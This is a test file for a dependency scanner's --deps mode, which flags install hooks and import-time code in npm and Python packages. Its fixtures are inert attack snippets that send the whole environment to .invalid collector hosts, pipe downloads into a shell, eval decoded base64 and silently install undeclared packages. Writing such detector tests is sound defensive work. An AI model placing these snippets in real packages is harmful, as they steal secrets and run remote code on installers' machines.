// --deps: what a dependency runs (src/deps.js, twin of core.dependency_checks;
// python/tests/scanner/test_review_dependency_checks.py has the same cases,
// and tests/architecture/test_js_parity.py compares the two CLIs on them).
// Each install hook of a dependency's manifest is followed to the files it
// runs and escalates to CRITICAL when one fails the install-script test; a
// dependency's other JavaScript and Python files get the import-time test
// (SC-IMPORT-RISK). Payloads are inert text: hosts are .invalid.

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync, symlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { run } from "../src/index.js";
import { treeJoin, npmEntries, webAssets } from "../src/deps.js";

const EXFIL = "const h = require('https');\n" +
  "h.request({host: 'collector.invalid', method: 'POST'}).end(JSON.stringify(process.env));\n";
const EXFIL_PY = "import os, json, requests\nrequests.post('https://collector.invalid/c', data=json.dumps(dict(os.environ)))\n";
const pkg = (name, scripts = {}) => JSON.stringify({ name, version: "1.0.0", scripts }, null, 2);
const bytes = (n, from = 0) => Buffer.from(Array.from({ length: n }, (_, k) => (from + k) % 256));

const TREE = {
  "package.json": pkg("app", { postinstall: "node build.js" }),
  "build.js": EXFIL,
  "scripts/first-party.js": EXFIL,
  "node_modules/a/package.json": pkg("a", { postinstall: "node install.dat" }),
  "node_modules/a/install.dat": EXFIL + "eval(atob('Y29uc29sZS5sb2coMSk='));\n",
  "node_modules/b/package.json": pkg("b", { postinstall: "sh ./install.sh" }),
  "node_modules/b/install.sh": "#!/bin/sh\ncurl -s -d \"$(env)\" https://collector.invalid/x\n",
  "node_modules/c/package.json": pkg("c", { install: "node lib" }),
  "node_modules/c/lib/package.json": JSON.stringify({ main: "core.dat" }),
  "node_modules/c/lib/core.dat": EXFIL,
  "node_modules/d/package.json": pkg("d", { postinstall: "node ./bin/setup" }),
  "node_modules/d/bin/setup": "#!/usr/bin/env node\n" + EXFIL,
  "node_modules/f/package.json": pkg("f", { postinstall: "node ../../scripts/first-party.js" }),
  "node_modules/g/package.json": pkg("g", { postinstall: "node blob.bin" }),
  "node_modules/g/blob.bin": Buffer.concat(Array(16).fill(bytes(256))),
  "node_modules/h/package.json": pkg("h", { postinstall: "cd a; ".repeat(1001) + "node x.js" }),
  "node_modules/i/package.json": JSON.stringify({ name: "i", version: "1.0.0" }),
  "node_modules/i/index.js": "module.exports = 1;\n" + EXFIL,
  "node_modules/i/lib/util.py": EXFIL_PY,
  "node_modules/j/package.json": pkg("j", { postinstall: "node excluded/x.js" }),
  "node_modules/j/excluded/x.js": EXFIL,
  "node_modules/k/package.json": pkg("k", { preinstall: "node x.dat", postinstall: "node x.dat && node x.dat" }),
  "node_modules/k/x.dat": EXFIL,
  "node_modules/l/package.json": pkg("l", { postinstall: "node half.dat" }),
  "node_modules/l/half.dat": Buffer.concat([Buffer.from("// text\n".repeat(300)), Buffer.concat(Array(4000).fill(bytes(8, 1)))]),
  "node_modules/n/package.json": JSON.stringify({ name: "n", version: "1.0.0" }),
  "node_modules/n/binding.gyp": "{'targets': [{'target_name': 'x', 'actions': [{'action_name': 'gen', 'action': ['sh', 'gen.sh']}]}]}\n",
  "node_modules/n/gen.sh": "curl -fsSL https://files.invalid/i.sh | sh\n",
  "node_modules/o/package.json": pkg("o", { postinstall: "node /usr/lib/x.js; node ../../../outside.js; node missing.js" }),
  "node_modules/q/package.json": pkg("q", { postinstall: "node --require ./pre.js main.cjs" }),
  "node_modules/q/pre.js": "require('child_process').execSync('curl -s https://files.invalid/x | sh');\n",
  "node_modules/q/main.cjs": "module.exports = 1;\n",
  "node_modules/r/package.json": pkg("r", { postinstall: "curl -s https://files.invalid/x | sh; node x.js" }),
  "node_modules/r/x.js": EXFIL,
  "node_modules/t/package.json": pkg("t", { postinstall: "node script" }),
  "node_modules/t/script": "#!/bin/sh\nwget -qO- https://files.invalid/i.sh | bash\n",
  "node_modules/v/index.js": EXFIL + `const token = "ghp_${"a1B2".repeat(9)}";\nconst seed = "Zq8vN3pL0wX7rT2mK9sB4hF6";\n`,
  "node_modules/u/package.json": pkg("u", { postinstall: "node install.js" }),
  "node_modules/u/install.js": "const fs = require('fs');\nfs.copyFileSync('a', 'b');\n",
};

function tree() {
  const root = mkdtempSync(join(tmpdir(), "lz-deps-"));
  for (const [rel, data] of Object.entries(TREE)) {
    const path = join(root, ...rel.split("/"));
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, data);
  }
  let linked = true;
  mkdirSync(join(root, "node_modules", "e"));
  writeFileSync(join(root, "node_modules", "e", "package.json"), pkg("e", { postinstall: "node x.js" }));
  try { symlinkSync(join(root, "build.js"), join(root, "node_modules", "e", "x.js")); } catch { linked = false; }
  return { root, linked };
}

function scan(root, ...extra) {
  const out = mkdtempSync(join(tmpdir(), "lz-deps-out-"));
  try {
    run(["check", root, "--out-dir", out, "--no-html", "--quiet", ...extra], { out: () => {}, err: () => {}, env: {} });
    return JSON.parse(readFileSync(join(out, "lazaret-report.json"), "utf8"));
  } finally {
    rmSync(out, { recursive: true, force: true });
  }
}
const slash = (p) => p.replaceAll("\\", "/");
const ENV = "sends environment variables over the network (the whole environment)";

test("--deps: hooks escalate on what they run; import-time code; what cannot be followed", () => {
  const { root, linked } = tree();
  try {
    const rep = scan(root, "--deps", "--exclude", "excluded");
    const hooks = {};
    for (const i of rep.issues.filter((x) => x.rule === "SC-INSTALL-HOOK")) (hooks[slash(i.file)] ??= []).push([i.sev, i.msg]);
    const critical = {
      "node_modules/a/package.json": `Install hook runs install.dat, which ${ENV}.`,
      "node_modules/b/package.json": `Install hook runs ./install.sh, which ${ENV}.`,
      "node_modules/c/package.json": `Install hook runs lib, which ${ENV}.`,
      "node_modules/d/package.json": `Install hook runs ./bin/setup, which ${ENV}.`,
      "node_modules/f/package.json": `Install hook runs ../../scripts/first-party.js, which ${ENV}.`,
      "node_modules/q/package.json": "Install hook runs ./pre.js, which pipes a download into a shell.",
      "node_modules/r/package.json": '"postinstall" script pipes a download into a shell.',
      "node_modules/t/package.json": "Install hook runs script, which pipes a download into a shell.",
    };
    for (const [manifest, msg] of Object.entries(critical)) assert.deepEqual(hooks[manifest], [["CRITICAL", msg]], manifest);
    assert.deepEqual(hooks["node_modules/k/package.json"], [["CRITICAL", `Install hook runs x.dat, which ${ENV}.`], ["CRITICAL", `Install hook runs x.dat, which ${ENV}.`]]);
    // n has a binding.gyp and no install script: npm runs `node-gyp rebuild` (the
    // implicit hook, MAJOR), which runs the action (CRITICAL)
    assert.deepEqual(hooks["node_modules/n/binding.gyp"], [
      ["CRITICAL", "Install hook runs gen.sh, which pipes a download into a shell."],
      ["MAJOR", `"install (implicit)" script runs code at install time: 'node-gyp rebuild'.`]]);
    for (const manifest of ["node_modules/g/package.json", "node_modules/h/package.json", "node_modules/j/package.json",
      "node_modules/l/package.json", "node_modules/o/package.json", "node_modules/u/package.json", "package.json",
      ...(linked ? ["node_modules/e/package.json"] : [])]) {
      assert.deepEqual(hooks[manifest].map(([sev]) => sev), ["MAJOR"], manifest);
    }
    const files = (rule) => rep.issues.filter((i) => i.rule === rule).map((i) => slash(i.file)).sort();
    assert.ok(files("SC-EVAL-DECODE").includes("node_modules/a/install.dat"));
    assert.deepEqual(files("SC-TRUNCATED"), ["node_modules/g/blob.bin", "node_modules/h/package.json", "node_modules/l/half.dat"]);
    assert.deepEqual(files("SC-IMPORT-RISK"), ["node_modules/i/index.js", "node_modules/i/lib/util.py", "node_modules/v/index.js"]);
    const risk = rep.issues.find((i) => i.rule === "SC-IMPORT-RISK" && slash(i.file) === "node_modules/i/index.js");
    assert.deepEqual([risk.sev, risk.line, risk.msg],
      ["CRITICAL", 3, "Dependency code reads credentials or the whole environment and sends data over the network."]);
    const redacted = rep.issues.find((i) => i.rule === "SC-IMPORT-RISK" && slash(i.file) === "node_modules/v/index.js");
    assert.equal(redacted.snippet.length, 4);
    assert.ok(!redacted.snippet.join("\n").includes("ghp_") && !redacted.snippet.join("\n").includes("Zq8vN3pL0wX7rT2mK9sB4hF6"));
    assert.equal(rep.metrics.depFiles, 12);

    const plain = scan(root, "--exclude", "excluded");                  // without --deps: nothing new
    assert.deepEqual(plain.issues.filter((i) => i.rule.startsWith("SC-")).map((i) => [i.rule, i.file, i.sev]),
      [["SC-INSTALL-HOOK", "package.json", "MAJOR"]]);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("treeJoin: inside the scan root only", () => {
  const cases = [
    [["node_modules/a", "x.js"], "node_modules/a/x.js"], [["node_modules/a", "./b/../x.js"], "node_modules/a/x.js"],
    [["node_modules/a", "../../y.js"], "y.js"], [["node_modules/a", "../../../y.js"], null],
    [["node_modules/a", "/usr/y.js"], null], [["node_modules/a", "C:/y.js"], null],
    [["node_modules/a", "lib\\z.js"], "node_modules/a/lib/z.js"], [["", "x.js"], "x.js"], [["", ".."], null],
    [["a", "."], "a"], [["a", ".."], null], [["a", "b//c/"], "a/b/c"],
  ];
  for (const [[base, target], want] of cases) assert.equal(treeJoin(base, target), want, `${base} + ${target}`);
});

// (the detection round) a web app's static assets run in a browser: left out unless an entry point
// reaches them (deps.js webAssets; the Python test has the same tree)
const WEB = "require('child_process').execSync('curl -s https://files.invalid/x | sh');\n";
const WEB_TREE = {
  "package.json": JSON.stringify({ name: "app", version: "1.0.0" }),
  "node_modules/w/package.json": JSON.stringify({ name: "w", version: "1.0.0", main: "lib/index.js" }),
  "node_modules/w/lib/index.js": "module.exports = require('../public/widget');\n",
  "node_modules/w/public/widget.js": WEB,
  "node_modules/w/public/other.js": WEB,
  "node_modules/w/static/chunk.js": WEB,
  "node_modules/w/_next/static/x.js": WEB,
  "node_modules/x/package.json": JSON.stringify({ name: "x", version: "1.0.0", main: "static/index.js", bin: { x: "./static/cli.js" },
    exports: { ".": "./static/index.js", "./y": { require: "./static/y.js" } } }),
  "node_modules/x/static/index.js": WEB,
  "node_modules/x/static/cli.js": WEB,
  "node_modules/x/static/y.js": WEB,
  "node_modules/x/static/z.js": WEB,
  "node_modules/s/package.json": JSON.stringify({ name: "s", version: "1.0.0" }),
  "node_modules/s/index.js": "const { spawn } = require('child_process');\nconst path = require('path');\n"
    + "spawn(process.execPath, [path.join(__dirname, 'public', 'run.js')], { detached: true });\n",
  "node_modules/s/public/run.js": WEB,
  "lib/python3.12/site-packages/ui/proxy/_experimental/out/_next/static/chunks/c.js": WEB,
  "lib/python3.12/site-packages/ui/__init__.py": "import os\nos.system('curl -s https://files.invalid/x | sh')\n",
};

test("--deps: a web app's static assets no entry point reaches are not code that runs", () => {
  const root = mkdtempSync(join(tmpdir(), "lz-deps-web-"));
  try {
    for (const [rel, data] of Object.entries(WEB_TREE)) {
      const path = join(root, ...rel.split("/"));
      mkdirSync(dirname(path), { recursive: true });
      writeFileSync(path, data);
    }
    const rep = scan(root, "--deps");
    assert.deepEqual(rep.issues.filter((i) => i.rule === "SC-IMPORT-RISK").map((i) => slash(i.file)).sort(), [
      "lib/python3.12/site-packages/ui/__init__.py", "node_modules/s/public/run.js", "node_modules/w/public/widget.js",
      "node_modules/x/static/cli.js", "node_modules/x/static/index.js", "node_modules/x/static/y.js",
    ]);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
  assert.deepEqual(npmEntries({ main: "a.js", module: "b.mjs", bin: { c: "c.js", d: 1 },
    exports: { ".": { import: "./e.mjs", require: ["./f.js", "./g.js"] }, "./*": "./h/*.js" } }),
  ["a.js", "b.mjs", "c.js", "./e.mjs", "./f.js", "./g.js"]);
  assert.deepEqual(npmEntries({ bin: "x.js", exports: "./y.js" }), ["x.js", "./y.js"]);
});

test("--deps: padding hides no file from the walk (BR-5)", () => {
  // the walk from a package's entry points stopped at 5,000 files, and its exports were read to 5,000 entry points,
  // so a file in static/ reached past them was left out as a web asset (the Python test: the same)
  const files = Array.from({ length: 5100 }, (_, i) => ({
    path: `node_modules/w/lib/f${i}.js`, content: `require('./f${i + 1}.js');\n`, lang: "js", dep: true,
  }));
  files.push({ path: "node_modules/w/lib/f5100.js", content: "require('../static/run.js');\n", lang: "js", dep: true },
    { path: "node_modules/w/static/run.js", content: WEB, lang: "js", dep: true });
  const manifest = {
    path: "node_modules/w/package.json", content: JSON.stringify({ name: "w", version: "1.0.0", main: "lib/f0.js" }),
  };
  const sources = new Map(files.map((f) => [f.path, f]));
  const manifests = new Map([[manifest.path, manifest]]);
  const tree = { sources, manifests, resolve: (p) => (sources.has(p) ? p : null) };
  assert.deepEqual([...webAssets(tree, files)], []);
  const exports = Object.fromEntries(Array.from({ length: 6000 }, (_, i) => [`./p${i}`, `./p${i}.js`]));
  assert.equal(npmEntries({ exports }).length, 6000);
});

test("--deps: each installed package's names for its tests (D-12b, D-9c)", () => {
  // python: tests/scanner/test_deps_package_names.py
  const chs = "const { execSync } = require('child_process');\n(function () {\n  try {\n" +
    "    execSync('npm uninstall prettier-sdk && npm install prettier-sdk', { stdio: 'ignore', windowsHide: true });\n" +
    "  } catch (e) { }\n})();\nmodule.exports = 1;\n";
  const gen = (target) => "const fs = require('fs');\nconst path = require('path');\n" +
    `const base = require.resolve('${target}/package.json').replace('/package.json', '');\n` +
    "fs.writeFileSync(path.join(base, 'lib', 'gen.js'), 'module.exports = 1;\\n');\nmodule.exports = 1;\n";
  const pip = "import subprocess, sys\nsubprocess.check_call([sys.executable, '-m', 'pip', 'install', 'evil-pkg'])\n";
  const meta = (requires) => `Metadata-Version: 2.1\nName: evil\nVersion: 1.0\n${requires}\nA description.\n`;
  const files = (fs) => {
    const root = mkdtempSync(join(tmpdir(), "lz-names-"));
    for (const [rel, data] of Object.entries(fs)) {
      mkdirSync(dirname(join(root, ...rel.split("/"))), { recursive: true });
      writeFileSync(join(root, ...rel.split("/")), data);
    }
    try {
      return scan(root, "--deps").issues.filter((i) => i.rule === "SC-IMPORT-RISK" || i.rule === "SC-INSTALL-HOOK")
        .map((i) => [i.rule, slash(i.file), i.sev, i.msg]);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  };
  const named = (deps) => JSON.stringify({ name: "hash-sdk", version: "1.0.0", ...deps });
  // an install at import of what it does not declare; what it declares; no package.json
  const [[rule, file, sev, msg]] = files({ "node_modules/hash-sdk/package.json": named({}), "node_modules/hash-sdk/index.js": chs });
  assert.deepEqual([rule, file, sev], ["SC-IMPORT-RISK", "node_modules/hash-sdk/index.js", "CRITICAL"]);
  assert.ok(msg.includes("installs packages the release does not depend on (prettier-sdk)"), msg);
  assert.deepEqual(files({ "node_modules/hash-sdk/package.json": named({ dependencies: { "prettier-sdk": "^1" } }),
    "node_modules/hash-sdk/index.js": chs }), []);
  assert.deepEqual(files({ "node_modules/hash-sdk/index.js": chs }), []);
  // its own folder is its own: at import and in its install script
  const genPkg = (scripts) => JSON.stringify({ name: "gen-pkg", version: "1.0.0", scripts });
  assert.deepEqual(files({ "node_modules/gen-pkg/package.json": genPkg({}), "node_modules/gen-pkg/index.js": gen("gen-pkg") }), []);
  const other = files({ "node_modules/gen-pkg/package.json": genPkg({}), "node_modules/gen-pkg/index.js": gen("other-pkg") });
  assert.deepEqual(other.map(([r, f, s]) => [r, f, s]), [["SC-IMPORT-RISK", "node_modules/gen-pkg/index.js", "CRITICAL"]]);
  assert.ok(other[0][3].includes("rewrites another package's code (other-pkg)"), other[0][3]);
  const hook = (target) => files({ "node_modules/gen-pkg/package.json": genPkg({ postinstall: "node gen.js" }),
    "node_modules/gen-pkg/gen.js": gen(target) }).filter(([r]) => r === "SC-INSTALL-HOOK");
  assert.ok(!hook("gen-pkg")[0][3].includes("rewrites another package's code"));
  assert.ok(hook("other-pkg")[0][3].includes("rewrites another package's code (other-pkg)"));
  // a Python distribution's: its METADATA's Name and Requires-Dist, by the RECORD that lists the module
  const site = (requires) => ({ "site-packages/evil/__init__.py": pip,
    "site-packages/evil-1.0.dist-info/METADATA": meta(requires),
    "site-packages/evil-1.0.dist-info/RECORD": "evil/__init__.py,sha256=x,1\nevil-1.0.dist-info/METADATA,,\n" });
  const [[, pyFile, pySev, pyMsg]] = files(site(""));
  assert.deepEqual([pyFile, pySev], ["site-packages/evil/__init__.py", "CRITICAL"]);
  assert.ok(pyMsg.includes("installs packages the release does not depend on (evil-pkg)"), pyMsg);
  assert.deepEqual(files(site("Requires-Dist: evil-pkg>=1; extra == 'x'\n")), []);
});
